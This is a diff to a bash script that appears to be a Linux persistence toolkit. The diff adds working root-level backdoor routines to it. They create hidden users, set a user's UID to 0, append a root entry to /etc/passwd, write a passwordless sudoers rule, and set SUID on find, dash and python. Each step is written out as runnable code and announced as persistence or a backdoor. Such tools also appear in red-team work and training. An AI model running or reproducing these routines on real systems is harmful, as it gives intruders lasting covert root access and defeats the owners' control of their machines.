@@ -134,6 +134,30 @@ usage_root() {
     echo "      --custom                     Use custom authorized keys settings"
     echo "          --key <key>                Specify the public key"
     echo "          --path <path>              Specify custom authorized keys file path"
+    echo "  --create-user                Create a new user"
+    echo "      --default                    Use default user creation settings"
+    echo "          --username <username>      Specify the username"
+    echo "          --password <password>      Specify the password"
+    echo "  --backdoor-user              Set up a backdoor user"
+    echo "      --default                    Use default backdoor user settings"
+    echo "          --username <username>      Specify the username"
+    echo "  --password-change            Change user password"
+    echo "      --default                    Use default password change settings"
+    echo "          --username <username>      Specify the username"
+    echo "          --password <password>      Specify the password"
+    echo "  --passwd-user                Add user to /etc/passwd with specified settings"
+    echo "      --default                    Use default passwd settings"
+    echo "          --username <username>      Specify the username"
+    echo "          --password <password>      Specify the password"
+    echo "      --custom                     Use custom passwd string"
+    echo "          --passwd-string <string>   Specify the passwd string"
+    echo "  --sudoers-backdoor           Set up sudoers backdoor"
+    echo "      --default                    Use default sudoers backdoor settings"
+    echo "          --username <username>      Specify the username"
+    echo "  --suid-backdoor              Set up SUID backdoor"
+    echo "      --default                    Use default SUID backdoor settings"
+    echo "      --custom                     Use custom SUID backdoor settings"
+    echo "          --binary <binary>          Specify the binary"
 }
 
 # Function for systemd setup
@@ -696,7 +720,6 @@ setup_xdg() {
     echo "[+] XDG persistence established."
 }
 
-# Function for generating SSH key
 setup_ssh_key() {
     if ! command -v ssh-keygen &> /dev/null; then
         echo "Error: 'ssh-keygen' is not installed. Please install it to use this feature."
@@ -842,6 +865,340 @@ setup_authorized_keys() {
     echo "[+] Persistence added to $path"
 }
 
+setup_new_user() {
+    local default=0
+    local username=""
+    local password=""
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --username )
+                shift
+                username=$1
+                ;;
+            --password )
+                shift
+                password=$1
+                ;;
+            * )
+                echo "Invalid option for --create-user: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 0 ]]; then
+        echo "Error: --default must be specified."
+        exit 1
+    fi
+
+    if [[ -z $username || -z $password ]]; then
+        echo "Error: --username and --password must be specified."
+        exit 1
+    fi
+
+    if ! check_root; then
+        echo "Error: This function can only be run as root."
+        exit 1
+    fi
+
+    useradd -M $username
+    echo "$username:$password" | chpasswd
+
+    echo "[+] Persistence through the new $username user established!"
+}
+
+setup_backdoor_user() {
+    local default=0
+    local username=""
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --username )
+                shift
+                username=$1
+                ;;
+            * )
+                echo "Invalid option for --backdoor-user: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 0 ]]; then
+        echo "Error: --default must be specified."
+        exit 1
+    fi
+
+    if [[ -z $username ]]; then
+        echo "Error: --username must be specified."
+        exit 1
+    fi
+
+    if ! check_root; then
+        echo "Error: This function can only be run as root."
+        exit 1
+    fi
+
+    usermod -u 0 -o $username
+
+    if [[ $? -eq 0 ]]; then
+        echo "[+] User $username has been modified to have UID 0 (root privileges)."
+    else
+        echo "[-] Failed to modify user $username."
+        exit 1
+    fi
+}
+
+setup_password_change() {
+    local default=0
+    local username=""
+    local password=""
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --username )
+                shift
+                username=$1
+                ;;
+            --password )
+                shift
+                password=$1
+                ;;
+            * )
+                echo "Invalid option for --password-change: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 0 ]]; then
+        echo "Error: --default must be specified."
+        exit 1
+    fi
+
+    if [[ -z $username || -z $password ]]; then
+        echo "Error: --username and --password must be specified."
+        exit 1
+    fi
+
+    if ! check_root; then
+        echo "Error: This function can only be run as root."
+        exit 1
+    fi
+
+    echo "$username:$password" | chpasswd
+
+    if [[ $? -eq 0 ]]; then
+        echo "[+] Password for user $username has been changed."
+    else
+        echo "[-] Failed to change password for user $username."
+        exit 1
+    fi
+}
+
+setup_passwd_user() {
+    local default=0
+    local custom=0
+    local username=""
+    local password=""
+    local passwd_string=""
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --custom )
+                custom=1
+                ;;
+            --username )
+                shift
+                username=$1
+                ;;
+            --password )
+                shift
+                password=$1
+                ;;
+            --passwd-string )
+                shift
+                passwd_string=$1
+                ;;
+            * )
+                echo "Invalid option for --passwd-user: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 1 && $custom -eq 1 ]]; then
+        echo "Error: --default and --custom cannot be specified together."
+        exit 1
+    fi
+
+    if [[ $default -eq 1 ]]; then
+        if [[ -z $username || -z $password ]]; then
+            echo "Error: --username and --password must be specified with --default."
+            exit 1
+        fi
+
+        if ! command -v openssl &> /dev/null; then
+            echo "Error: openssl is not installed on this system. Use --custom with --passwd-string instead."
+            exit 1
+        fi
+
+        openssl_password=$(openssl passwd "$password")
+        if [[ $? -eq 0 ]]; then
+            echo "$username:$openssl_password:0:0:root:/root:/bin/bash" >> /etc/passwd
+            echo "[+] User $username added to /etc/passwd with root privileges."
+        else
+            echo "[-] Failed to generate password hash with openssl."
+            exit 1
+        fi
+
+    elif [[ $custom -eq 1 ]]; then
+        if [[ -z $passwd_string ]]; then
+            echo "Error: --passwd-string must be specified with --custom."
+            exit 1
+        fi
+
+        echo "$passwd_string" >> /etc/passwd
+        echo "[+] Custom passwd string added to /etc/passwd."
+    else
+        echo "Error: Either --default or --custom must be specified for --passwd-user."
+        exit 1
+    fi
+}
+
+setup_sudoers_backdoor() {
+    local default=0
+    local username=""
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --username )
+                shift
+                username=$1
+                ;;
+            * )
+                echo "Invalid option for --sudoers-backdoor: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 0 ]]; then
+        echo "Error: --default must be specified."
+        exit 1
+    fi
+
+    if [[ -z $username ]]; then
+        echo "Error: --username must be specified."
+        exit 1
+    fi
+
+    if ! check_root; then
+        echo "Error: This function can only be run as root."
+        exit 1
+    fi
+
+    echo "$username ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/$username
+
+    if [[ $? -eq 0 ]]; then
+        echo "[+] User $username can now run all commands without a sudo password."
+    else
+        echo "[-] Failed to create sudoers backdoor for user $username."
+        exit 1
+    fi
+}
+
+setup_suid_backdoor() {
+    local default=0
+    local custom=0
+    local binary=""
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --custom )
+                custom=1
+                ;;
+            --binary )
+                shift
+                binary=$1
+                ;;
+            * )
+                echo "Invalid option for --suid-backdoor: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 1 && $custom -eq 1 ]]; then
+        echo "Error: --default and --custom cannot be specified together."
+        exit 1
+    fi
+
+    if [[ $default -eq 0 && $custom -eq 0 ]]; then
+        echo "Error: Either --default or --custom must be specified."
+        exit 1
+    fi
+
+    if ! check_root; then
+        echo "Error: This function can only be run as root."
+        exit 1
+    fi
+
+    if [[ $default -eq 1 ]]; then
+        local binaries=("find" "dash" "python" "python3")
+
+        for bin in "${binaries[@]}"; do
+            if command -v $bin &> /dev/null; then
+                local path=$(command -v $bin)
+                chmod u+s $path
+                if [[ $? -eq 0 ]]; then
+                    echo "[+] SUID privilege granted to $path"
+                else
+                    echo "[-] Failed to grant SUID privilege to $path"
+                fi
+            else
+                echo "[-] $bin is not present on the system."
+            fi
+        done
+    elif [[ $custom -eq 1 ]]; then
+        if [[ -z $binary ]]; then
+            echo "Error: --binary must be specified with --custom."
+            exit 1
+        fi
+
+        if command -v $binary &> /dev/null; then
+            local path=$(command -v $binary)
+            chmod u+s $path
+            if [[ $? -eq 0 ]]; then
+                echo "[+] SUID privilege granted to $path"
+            else
+                echo "[-] Failed to grant SUID privilege to $path"
+            fi
+        else
+            echo "[-] $binary is not present on the system."
+        fi
+    fi
+}
+
 # Main function
 main() {
     local QUIET=0
@@ -919,6 +1276,36 @@ main() {
             --xdg )
                 shift
                 setup_xdg "$@"
+                exit
+                ;;
+            --create-user )
+                shift
+                setup_new_user "$@"
+                exit
+                ;;
+            --backdoor-user )
+                shift
+                setup_backdoor_user "$@"
+                exit
+                ;;
+            --password-change )
+                shift
+                setup_password_change "$@"
+                exit
+                ;;
+            --passwd-user )
+                shift
+                setup_passwd_user "$@"
+                exit
+                ;;
+            --sudoers-backdoor )
+                shift
+                setup_sudoers_backdoor "$@"
+                exit
+                ;;
+            --suid-backdoor )
+                shift
+                setup_suid_backdoor "$@"
                 exit
                 ;;
             * )
